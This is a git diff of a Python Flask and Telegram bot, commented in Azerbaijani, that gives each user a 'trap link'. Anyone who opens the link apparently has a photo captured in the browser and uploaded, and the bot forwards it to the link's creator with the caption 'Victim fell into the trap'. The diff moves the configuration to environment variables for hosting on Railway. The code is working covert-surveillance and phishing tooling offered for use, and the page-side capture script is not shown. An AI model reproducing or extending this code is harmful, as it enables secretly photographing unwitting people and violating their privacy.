@@ -1,68 +1,74 @@
-import telebot
 import os
+import telebot
 import uuid
 import base64
 from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
 from threading import Thread
 
-# --- KONFİQURASİYA ---
-API_TOKEN = 'SƏNİN_BOT_TOKENİN'
-DOMAIN = 'https://senin-saytin.vercel.app' # Sonra bura real linki qoyacağıq
+# --- KONFİQURASİYA (Hostinqdə Variables hissəsinə əlavə et) ---
+API_TOKEN = os.environ.get('BOT_TOKEN') # Sənin 8519... tokenin bura gələcək
+MY_CHAT_ID = os.environ.get('MY_CHAT_ID') # Sənin 7754... ID-n bura gələcək
+DOMAIN = os.environ.get('DOMAIN') # Railway-in sənə verdiyi https linki
+
 bot = telebot.TeleBot(API_TOKEN)
 app = Flask(__name__)
 CORS(app)
 
-# Sadə verilənlər bazası (Token: Chat_ID)
-# Professional versiyada SQLite istifadə oluna bilər
+# Aktiv linkləri yadda saxlayan baza (RAM üzərində)
 user_db = {}
 
-# --- TELEGRAM BOT HİSSƏSİ ---
-@bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-    bot.reply_to(message, "👋 Salam! Özəl xaker linki yaratmaq üçün /link yaz.")
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    bot.reply_to(message, "📸 **Xaker Botuna xoş gəldin!**\n\nÖz tələ linkini yaratmaq üçün /link yaz.")
 
 @bot.message_handler(commands=['link'])
 def create_link(message):
     chat_id = message.chat.id
-    token = str(uuid.uuid4())[:8] # Hər kəs üçün unikal 8 rəqəmli kod
+    # Hər istifadəçiyə özəl 8 simvollu unikal kod
+    token = str(uuid.uuid4())[:8]
     user_db[token] = chat_id
     
     trap_url = f"{DOMAIN}/?t={token}"
-    bot.reply_to(message, f"🚀 Sənin özəl linkin hazırdır:\n\n`{trap_url}`\n\nBu linkə girənin şəkli birbaşa bura gələcək.", parse_mode="Markdown")
+    bot.reply_to(message, f"🎯 **Tələ linkin hazırdır:**\n\n`{trap_url}`\n\nBu linkə girən hər kəsin şəkli birbaşa bura gələcək!", parse_mode="Markdown")
 
-# --- API (ŞƏKİL QƏBULU) HİSSƏSİ ---
 @app.route('/')
 def index():
     return render_template('index.html')
 
 @app.route('/upload', methods=['POST'])
 def upload_photo():
-    data = request.json
-    token = data.get('token')
-    image_b64 = data.get('image')
+    try:
+        data = request.json
+        token = data.get('token')
+        image_b64 = data.get('image')
 
-    if token in user_db:
-        chat_id = user_db[token]
-        # Base64-ü şəkil faylına çeviririk
-        img_bytes = base64.b64decode(image_b64.split(',')[1])
-        
-        with open(f"temp_{token}.png", "wb") as f:
-            f.write(img_bytes)
-        
-        # Telegram-a göndəririk
-        with open(f"temp_{token}.png", "rb") as photo:
-            bot.send_photo(chat_id, photo, caption="📸 Qurban tələyə düşdü!")
-        
-        os.remove(f"temp_{token}.png") # Faylı silirik (təmizlik)
-        return jsonify({"status": "ok"}), 200
+        if token in user_db:
+            target_chat = user_db[token]
+            # Base64 formatlı şəkli təmizləyib fayla çeviririk
+            img_bytes = base64.b64decode(image_b64.split(',')[1])
+            
+            filename = f"capture_{token}.png"
+            with open(filename, "wb") as f:
+                f.write(img_bytes)
+            
+            # Telegram-a göndəriş
+            with open(filename, "rb") as photo:
+                bot.send_photo(target_chat, photo, caption="⚠️ **DİQQƏT!** Qurban tələyə düşdü və şəkli çəkildi.")
+            
+            os.remove(filename) # Serverdə yer tutmasın deyə silirik
+            return jsonify({"status": "success"}), 200
+    except Exception as e:
+        print(f"Server xətası: {e}")
     
-    return jsonify({"status": "error"}), 400
+    return jsonify({"status": "fail"}), 400
 
-# Botu və Flask-ı eyni anda işlətmək üçün
 def run_flask():
-    app.run(host='0.0.0.0', port=5000)
+    # Railway-in verdiyi portu istifadə edirik
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
+    # Flask və Botu eyni anda işlətmək üçün Thread istifadə edirik
     Thread(target=run_flask).start()
     bot.infinity_polling()
